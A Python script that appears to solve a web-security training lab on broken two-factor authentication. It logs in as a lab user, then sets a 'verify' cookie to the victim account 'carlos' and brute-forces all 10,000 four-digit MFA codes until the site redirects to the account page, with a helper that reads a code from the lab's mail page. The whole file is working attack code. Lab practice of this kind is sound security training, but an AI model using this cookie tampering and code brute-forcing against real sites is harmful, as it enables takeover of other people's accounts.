import requests

url = "https://0adb005f04675bdec0827bbd00340038.web-security-academy.net/login" # please change url :)
username = "wiener"
password = "peter"
victim = "carlos"

def login(username,password):
    req = requests.Session()
    req = requests.post(url, data={"username": username, "password": password})
    cookie =  req.request.headers['Cookie'].split('=')[-1].strip()
    # print(req.request.headers['Cookie'])
    return req.url,cookie

def attack(url,cookie):
    for i in range(0,9999):
        opt = str(i).zfill(4)
        req = requests.post(url, data={"mfa-code": opt},cookies={'session': cookie,'verify': victim})
        if req.url.split("/")[-1] == "my-account":
            print(f"\33[32m{opt} is the correct code\033[0m")
            break
        else:
            print(f"\33[31m {opt} not working\033[0m")
            continue

# for test login
def test(url,cookie):
    url_opt = "https://exploit-0a97004604ac5b12c0967b20016f00ef.web-security-academy.net/email" # to get opt in maill Please Change url :)
    req_to_opt = requests.get(url_opt)
    opt_for_test =  (req_to_opt.text.split("code is ")[1][0:4])
    # print(opt_for_test,cookie)
    for i in range(int(opt_for_test)-5,int(opt_for_test)+2):

        req = requests.post(url, data={"mfa-code": str(i).zfill(4)},cookies={'session': cookie,'verify': username})      
        if req.url.split("/")[-1] == "my-account":   # then login successfully
            print(f"\33[32m{str(i).zfill(4)} is the correct code\033[0m")
            break
        else:
            print(f"\33[31m {str(i).zfill(4)} not working\33[0m")
            continue
            
if __name__ == "__main__":
    url,cookie = login(username,password)
    attack(url,cookie)
    # test(url,cookie) # test code if worke
